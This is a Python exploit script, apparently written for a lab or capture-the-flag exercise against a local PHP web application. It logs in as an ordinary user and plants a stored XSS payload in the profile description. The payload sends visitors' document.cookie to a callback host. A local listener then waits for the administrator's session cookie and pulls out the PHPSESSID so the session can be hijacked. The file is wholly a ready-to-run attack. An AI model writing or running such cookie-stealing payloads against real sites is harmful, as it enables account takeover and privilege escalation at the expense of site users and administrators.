"""
Usage:
  python3 privilege_excalation.py http://localhost:8000 user1 user1
"""
import sys
import urllib.parse
import http.server
import socketserver

import requests

BIND_HOST     = "localhost"
CALLBACK_HOST = "host.docker.internal"
LISTEN_PORT   = 8001


def login(sess, base, user, pwd):
    r = sess.post(base + '/login.php',
                  data={"username": user, "password": pwd},
                  allow_redirects=True)

    has_session = any(c.name == "PHPSESSID" for c in sess.cookies)
    failed = "Invalid" in r.text or "invalid" in r.text
    if not has_session or failed:
        sys.exit("[-] Login error.")
    print(f"[*] Logged in as {user}")


def set_payload(sess, base):
    payload =  '<img src=mijat onerror="'+f"new Image().src='http://{CALLBACK_HOST}:{LISTEN_PORT}/?c='"+'+encodeURIComponent(document.cookie)">'
    sess.post(base + '/profile.php', data={"description": payload}, allow_redirects=True)
    print(f"[*] Set {USER}'s description to XSS payload")


def wait_for_admin_cookie():
    captured = {"cookie": None}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            if "c" in params:
                captured["cookie"] = urllib.parse.unquote(params["c"][0])
            self.send_response(200)
            self.end_headers()

        def log_message(self, *a):
            pass

    print(f"[*] Listening on {BIND_HOST}:{LISTEN_PORT} (payload salje na {CALLBACK_HOST}:{LISTEN_PORT})...")
    print("[*] Waiting for admin to visit homepage...")
    with socketserver.TCPServer((BIND_HOST, LISTEN_PORT), Handler) as httpd:
        while captured["cookie"] is None:
            httpd.handle_request()
    return captured["cookie"]


def extract_phpsessid(cookie_str):
    for part in cookie_str.split(";"):
        k, _, v = part.strip().partition("=")
        if k == "PHPSESSID":
            return v
    return None


if __name__ == "__main__":

    BASE = sys.argv[1].rstrip("/")
    USER = sys.argv[2]
    PASS = sys.argv[3]

    s = requests.Session()
    login(s, BASE, USER, PASS)
    set_payload(s, BASE)

    raw_cookie = wait_for_admin_cookie()
    print(f"[+] Got admin cookie: {raw_cookie}")

    sid = extract_phpsessid(raw_cookie)
    if sid:
        print(f"\n[=] Session ID: {sid}")